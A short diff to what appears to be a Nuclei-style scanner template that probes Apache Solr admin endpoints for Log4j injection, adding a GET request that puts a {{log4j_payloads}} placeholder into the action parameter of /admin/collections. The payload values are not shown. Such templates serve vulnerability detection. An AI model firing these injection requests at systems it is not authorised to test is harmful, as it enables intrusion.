@@ -11,11 +11,16 @@ requests:
       - |
         GET /admin/cores?action=CREATE&name={{log4j_payloads}}&wt=json HTTP/1.1
         Host: {{Hostname}}
-
+      
+      - |
+        GET /admin/collections?action={{log4j_payloads}}&wt=json HTTP/1.1
+        Host: {{Hostname}}
 
       - |
         POST /admin/cores?action=CREATE&name={{log4j_payloads}}&wt=json HTTP/1.1
         Host: {{Hostname}}
+
+
 
     payloads:
       log4j_payloads:
